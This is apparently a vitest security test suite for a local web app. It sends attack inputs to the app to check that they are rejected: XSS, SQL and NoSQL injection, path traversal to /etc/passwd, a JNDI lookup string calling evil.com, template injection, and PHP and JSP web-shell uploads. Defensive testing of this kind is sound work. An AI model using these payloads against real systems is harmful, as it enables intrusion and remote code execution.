import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import axios from 'axios';

// Security test configuration
const BASE_URL = 'http://localhost:8080';
const AUTH_URL = `${BASE_URL}/auth`;
const INSTRUCTIONS_URL = `${BASE_URL}/instructions`;
const ANALYTICS_URL = `${BASE_URL}/analytics`;

// Test data
const testUser = {
  email: 'security-test@example.com',
  password: 'password123',
  firstName: 'Security',
  lastName: 'Test'
};

const maliciousInputs = [
  '<script>alert("XSS")</script>',
  '"; DROP TABLE users; --',
  '../../../etc/passwd',
  '${jndi:ldap://evil.com/a}',
  '{{7*7}}',
  'javascript:alert(1)',
  '<img src=x onerror=alert(1)>',
  'admin\' OR \'1\'=\'1',
  'UNION SELECT * FROM users',
  '../../../../etc/passwd%00',
  'eval(require("child_process").exec("ls"))',
  '{{constructor.constructor("return process")().exit()}}'
];

describe('Security Tests', () => {
  let authToken: string;
  let userId: string;

  beforeAll(async () => {
    // Register test user
    try {
      await axios.post(`${AUTH_URL}/register`, {
        ...testUser,
        confirmPassword: testUser.password
      });
    } catch (error) {
      // User might already exist
    }

    // Login to get token
    const loginResponse = await axios.post(`${AUTH_URL}/login`, {
      email: testUser.email,
      password: testUser.password
    });

    authToken = loginResponse.data.token;
    userId = loginResponse.data.user.id;
  });

  describe('Authentication Security', () => {
    it('should prevent SQL injection in login', async () => {
      const maliciousPayloads = [
        "admin' OR '1'='1' --",
        "admin' OR 1=1 --",
        "admin'; DROP TABLE users; --",
        "admin' UNION SELECT * FROM users --"
      ];

      for (const payload of maliciousPayloads) {
        try {
          const response = await axios.post(`${AUTH_URL}/login`, {
            email: payload,
            password: 'anything'
          });
          
          // Should not return 200 with valid user data
          expect(response.status).not.toBe(200);
        } catch (error: any) {
          // Should return 401 or 400
          expect([401, 400]).toContain(error.response?.status);
        }
      }
    });

    it('should prevent brute force attacks', async () => {
      const wrongPassword = 'wrongpassword';
      let rateLimited = false;

      // Try to login with wrong password multiple times
      for (let i = 0; i < 15; i++) {
        try {
          await axios.post(`${AUTH_URL}/login`, {
            email: testUser.email,
            password: wrongPassword
          });
        } catch (error: any) {
          if (error.response?.status === 429) {
            rateLimited = true;
            break;
          }
        }
      }

      expect(rateLimited).toBe(true);
    });

    it('should validate JWT token properly', async () => {
      const invalidTokens = [
        'invalid-token',
        'Bearer invalid-token',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
        '',
        null,
        undefined
      ];

      for (const token of invalidTokens) {
        try {
          await axios.get(`${AUTH_URL}/me`, {
            headers: {
              Authorization: `Bearer ${token}`
            }
          });
          expect.fail('Should have thrown error for invalid token');
        } catch (error: any) {
          expect([401, 403]).toContain(error.response?.status);
        }
      }
    });

    it('should prevent token replay attacks', async () => {
      // Get a valid token
      const loginResponse = await axios.post(`${AUTH_URL}/login`, {
        email: testUser.email,
        password: testUser.password
      });

      const token = loginResponse.data.token;

      // Use the same token multiple times (should work)
      const response1 = await axios.get(`${AUTH_URL}/me`, {
        headers: { Authorization: `Bearer ${token}` }
      });

      const response2 = await axios.get(`${AUTH_URL}/me`, {
        headers: { Authorization: `Bearer ${token}` }
      });

      expect(response1.status).toBe(200);
      expect(response2.status).toBe(200);
    });
  });

  describe('Input Validation Security', () => {
    it('should prevent XSS attacks in user input', async () => {
      for (const maliciousInput of maliciousInputs) {
        try {
          // Test XSS in instruction creation
          const response = await axios.post(`${INSTRUCTIONS_URL}`, {
            title: maliciousInput,
            content: 'Test content',
            category: 'safety',
            priority: 'high',
            status: 'active'
          }, {
            headers: { Authorization: `Bearer ${authToken}` }
          });

          // If request succeeds, check that input is sanitized
          if (response.status === 201) {
            expect(response.data.data.title).not.toContain('<script>');
            expect(response.data.data.title).not.toContain('javascript:');
            expect(response.data.data.title).not.toContain('onerror=');
          }
        } catch (error: any) {
          // Should return 400 for malicious input
          expect([400, 403]).toContain(error.response?.status);
        }
      }
    });

    it('should prevent NoSQL injection', async () => {
      const nosqlPayloads = [
        { $where: 'this.password == this.password' },
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' }
      ];

      for (const payload of nosqlPayloads) {
        try {
          const response = await axios.get(`${INSTRUCTIONS_URL}`, {
            params: payload,
            headers: { Authorization: `Bearer ${authToken}` }
          });

          // Should not return sensitive data
          expect(response.data.data).not.toContain('password');
          expect(response.data.data).not.toContain('$where');
        } catch (error: any) {
          // Should handle injection attempts gracefully
          expect([400, 500]).toContain(error.response?.status);
        }
      }
    });

    it('should validate file uploads', async () => {
      const maliciousFiles = [
        { name: 'malicious.php', content: '<?php system($_GET["cmd"]); ?>' },
        { name: 'malicious.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' },
        { name: 'malicious.exe', content: 'MZ...' },
        { name: '../../../etc/passwd', content: 'root:x:0:0:root:/root:/bin/bash' }
      ];

      for (const file of maliciousFiles) {
        try {
          const formData = new FormData();
          formData.append('file', new Blob([file.content]), file.name);
          formData.append('instructionId', '1');

          const response = await axios.post(`${INSTRUCTIONS_URL}/upload`, formData, {
            headers: {
              Authorization: `Bearer ${authToken}`,
              'Content-Type': 'multipart/form-data'
            }
          });

          expect.fail('Should have rejected malicious file');
        } catch (error: any) {
          expect([400, 403, 415]).toContain(error.response?.status);
        }
      }
    });
  });

  describe('Authorization Security', () => {
    it('should prevent privilege escalation', async () => {
      // Try to access admin endpoints with regular user token
      const adminEndpoints = [
        `${ANALYTICS_URL}/dashboard`,
        `${INSTRUCTIONS_URL}`,
        `${INSTRUCTIONS_URL}/templates`
      ];

      for (const endpoint of adminEndpoints) {
        try {
          const response = await axios.get(endpoint, {
            headers: { Authorization: `Bearer ${authToken}` }
          });

          // Should return 403 for unauthorized access
          if (response.status === 200) {
            // If it returns 200, make sure it's not admin data
            expect(response.data.data).not.toHaveProperty('adminOnlyData');
          }
        } catch (error: any) {
          expect([403, 401]).toContain(error.response?.status);
        }
      }
    });

    it('should prevent horizontal privilege escalation', async () => {
      // Try to access another user's data
      const otherUserId = '999';
      
      try {
        const response = await axios.get(`${AUTH_URL}/users/${otherUserId}`, {
          headers: { Authorization: `Bearer ${authToken}` }
        });

        expect.fail('Should not be able to access other user data');
      } catch (error: any) {
        expect([403, 404]).toContain(error.response?.status);
      }
    });

    it('should validate resource ownership', async () => {
      // Try to modify instruction created by another user
      try {
        const response = await axios.put(`${INSTRUCTIONS_URL}/999`, {
          title: 'Hacked Title'
        }, {
          headers: { Authorization: `Bearer ${authToken}` }
        });

        expect.fail('Should not be able to modify other user resources');
      } catch (error: any) {
        expect([403, 404]).toContain(error.response?.status);
      }
    });
  });

  describe('Data Security', () => {
    it('should not expose sensitive data in responses', async () => {
      const response = await axios.get(`${AUTH_URL}/me`, {
        headers: { Authorization: `Bearer ${authToken}` }
      });

      const userData = response.data.data;
      
      // Should not contain sensitive fields
      expect(userData).not.toHaveProperty('password');
      expect(userData).not.toHaveProperty('passwordHash');
      expect(userData).not.toHaveProperty('salt');
      expect(userData).not.toHaveProperty('internalId');
    });

    it('should encrypt sensitive data at rest', async () => {
      // This would require database access to verify encryption
      // For now, we'll test that passwords are not stored in plain text
      const response = await axios.get(`${AUTH_URL}/me`, {
        headers: { Authorization: `Bearer ${authToken}` }
      });

      expect(response.data.data.password).toBeUndefined();
    });

    it('should use secure headers', async () => {
      const response = await axios.get(`${BASE_URL}/`, {
        headers: { Authorization: `Bearer ${authToken}` }
      });

      const headers = response.headers;
      
      // Check for security headers
      expect(headers['x-content-type-options']).toBe('nosniff');
      expect(headers['x-frame-options']).toBeDefined();
      expect(headers['x-xss-protection']).toBeDefined();
      expect(headers['strict-transport-security']).toBeDefined();
    });
  });

  describe('API Security', () => {
    it('should prevent CSRF attacks', async () => {
      // Try to make state-changing request without proper CSRF protection
      try {
        const response = await axios.post(`${INSTRUCTIONS_URL}`, {
          title: 'CSRF Test',
          content: 'Test content',
          category: 'safety',
          priority: 'high',
          status: 'active'
        }, {
          headers: { 
            Authorization: `Bearer ${authToken}`,
            // Missing CSRF token
          }
        });

        // Should either succeed (if CSRF protection is not implemented)
        // or fail with 403 (if CSRF protection is implemented)
        expect([200, 201, 403]).toContain(response.status);
      } catch (error: any) {
        expect([403, 400]).toContain(error.response?.status);
      }
    });

    it('should prevent parameter pollution', async () => {
      try {
        const response = await axios.get(`${INSTRUCTIONS_URL}`, {
          params: {
            category: 'safety',
            category: 'equipment', // Duplicate parameter
            priority: 'high',
            priority: 'low' // Duplicate parameter
          },
          headers: { Authorization: `Bearer ${authToken}` }
        });

        // Should handle duplicate parameters gracefully
        expect([200, 400]).toContain(response.status);
      } catch (error: any) {
        expect([400, 500]).toContain(error.response?.status);
      }
    });

    it('should prevent HTTP verb tampering', async () => {
      const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'];
      
      for (const method of methods) {
        try {
          const response = await axios.request({
            method: method as any,
            url: `${INSTRUCTIONS_URL}/1`,
            headers: { Authorization: `Bearer ${authToken}` }
          });

          // Should only allow appropriate methods
          if (method === 'GET') {
            expect([200, 404]).toContain(response.status);
          } else if (['POST', 'PUT', 'DELETE'].includes(method)) {
            expect([200, 201, 400, 403, 404, 405]).toContain(response.status);
          } else {
            expect([200, 404, 405]).toContain(response.status);
          }
        } catch (error: any) {
          expect([400, 403, 404, 405, 500]).toContain(error.response?.status);
        }
      }
    });
  });

  describe('Rate Limiting Security', () => {
    it('should enforce rate limiting on sensitive endpoints', async () => {
      const sensitiveEndpoints = [
        `${AUTH_URL}/login`,
        `${AUTH_URL}/register`,
        `${AUTH_URL}/forgot-password`
      ];

      for (const endpoint of sensitiveEndpoints) {
        let rateLimited = false;
        
        // Make many requests quickly
        for (let i = 0; i < 20; i++) {
          try {
            await axios.post(endpoint, {
              email: 'test@example.com',
              password: 'password123'
            });
          } catch (error: any) {
            if (error.response?.status === 429) {
              rateLimited = true;
              break;
            }
          }
        }

        expect(rateLimited).toBe(true);
      }
    });
  });

  describe('Error Handling Security', () => {
    it('should not expose sensitive information in error messages', async () => {
      try {
        await axios.get(`${INSTRUCTIONS_URL}/nonexistent`, {
          headers: { Authorization: `Bearer ${authToken}` }
        });
      } catch (error: any) {
        const errorMessage = error.response?.data?.error || '';
        
        // Should not contain sensitive information
        expect(errorMessage).not.toContain('password');
        expect(errorMessage).not.toContain('token');
        expect(errorMessage).not.toContain('database');
        expect(errorMessage).not.toContain('connection');
        expect(errorMessage).not.toContain('stack');
      }
    });

    it('should handle malformed requests gracefully', async () => {
      const malformedRequests = [
        { method: 'POST', url: `${AUTH_URL}/login`, data: 'invalid json' },
        { method: 'GET', url: `${INSTRUCTIONS_URL}?invalid=param&another=param` },
        { method: 'POST', url: `${INSTRUCTIONS_URL}`, data: { invalid: 'structure' } }
      ];

      for (const request of malformedRequests) {
        try {
          await axios.request(request);
        } catch (error: any) {
          // Should return appropriate error status
          expect([400, 422, 500]).toContain(error.response?.status);
        }
      }
    });
  });
});
